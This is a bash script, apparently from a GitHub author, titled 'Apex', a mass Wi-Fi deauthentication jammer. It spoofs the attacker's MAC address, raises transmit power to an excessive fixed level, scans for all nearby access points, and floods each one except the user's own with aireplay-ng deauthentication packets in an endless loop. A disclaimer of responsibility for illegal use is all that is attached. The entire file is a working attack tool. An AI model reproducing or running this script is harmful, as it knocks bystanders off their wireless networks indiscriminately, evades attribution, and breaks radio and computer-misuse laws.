#!/bin/bash
time=".1"
Deauth="15"
apMAC="5C:7D:7D:33:31:01"
REASON="7"

if [[ $EUID -ne 0 ]]; then
	echo -e "\033[31m\n    [!] MUST BE ROOT, exiting...[!]\033[0m\n" 1>&2
	sleep 1; exit 1
fi

for i in airmon-ng aireplay-ng iw ip iwlist macchanger; do
	command -v $i > /dev/null 2>&1 || {
		echo -e >&2 "\033[31m\n    [!] This script requires $i to be installed. Exiting... [!]\033[0m\n"
		sleep 1; exit 1
	}
done

function usage() {
	cat << EOF

    Usage: $0 [OPTIONS] [ARGUMENTS]

    OPTIONS:
	-d	Number of packets to send. (Default: 15)
	-h	Show this help screen.
	-i	IFace to listen for APs.
	-m	MAC of your AP (Default: 5C:7D:7D:33:31:01)
	-w	Seconds to wait after # of packets are sent (Default: .1)
	-o	IFace to send deauthentication packets.
	-r	Reason Code (Default: 7)
    Example: sudo $0 -d 15 -i wlan0 -o wlan1 -m 5C:7D:7D:33:31:01 -w .1

EOF
}
function rmlogs() {
	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
}
function cleanup() {
	echo -e "\n\n\033[31m[!] Haulting all instances of aireplay-ng...\033[0m"
	killall -9 aireplay-ng &> /dev/null
	sleep 1; rmlogs
	clear
	exit 0
}

flags=':d:hi:m:w:o:r:m:'
while getopts $flags option; do
	case $option in
		d) Deauth=$OPTARG;;
		h) usage; exit;;
		i) INCOMING=$OPTARG;;
		m) apMAC=$OPTARG;;
		w) time=$OPTARG;;
        o) OUTGOING=$OPTARG;;
		r) REASON=$OPTARG;;
		\?) echo "Unknown option: -$OPTARG" >&2; exit 1;;
		:) echo "Missing argument for option: -$OPTARG" >&2; exit 1;;
		*) echo "Unimplemented option: -$OPTARG" >&2; exit 1;;
	esac
done
shift $(($OPTIND - 1))

version="0.2"
atk="0"
figuredMAC=$(arp -a | grep -E -o '[[:xdigit:]]{2}(:[[:xdigit:]]{2}){5}')

clear
echo -e "--------------------------------------------"
echo -e "| Apex :: Mass AP deauthentication/Jammer  |"
echo -e "| By: MBHudson 2023 // github.com/MBHudson |"
echo -e "--------------------------------------------"
echo -e "   !!!NOT RESPONSIBLE FOR ILLEGAL USE!!! "
echo ""
echo ""
echo ""
echo -e "\033[32m[+]\033[0m Setting up for attack..."

export apMAC

trap cleanup INT
rmlogs

echo -e "\033[32m[+]\033[0m Changing wireless card MAC address..."
ip link set $OUTGOING down && macchanger -A $OUTGOING && ip link set $OUTGOING up
sleep 5
scan1="0"

while true; do
	rmlogs
	iwconfig $OUTGOING mode master &> /dev/null &
	iw $OUTGOING set txpower fixed 3000 &> /dev/null &
	iwlist $INCOMING scan > /tmp/scan.tmp
	awk --posix '$5 ~ /[0-9a-zA-F]{2}:/ && $5 !~ /'$apMAC'/ {print $5}' /tmp/scan.tmp > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	num=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	echo -e "\033[32m[>]\033[0m Detected $num APs..."
	for (( b=1; b<=$num; b++ )); do
			scan1="1"
			chan=`cat /tmp/APchannels.lst | head -n $b`
			AP=`sed -n -e ''$b'p' '/tmp/APmacs.lst'`
			echo -e "\033[32m[>]\033[0m Deauthenticating AP BSSID: $AP..."
			aireplay-ng -0 $Deauth --deauth-rc $REASON -D -a $AP $OUTGOING &> /dev/null &
			#aireplay-ng -0 $Deauth -D -a $AP $INCOMING &> /dev/null &
	done
	atk="1"
	echo -e "\033[32m[>]\033[0m Waiting $time seconds after packets are sent to target to restart...\n\n\033[33m[!] Press [ CTRL+C ] to cancel the attack at any time. \033[0m\n" && sleep $time
	for active in `jobs -p`; do
		wait $active
		clear
	done
done
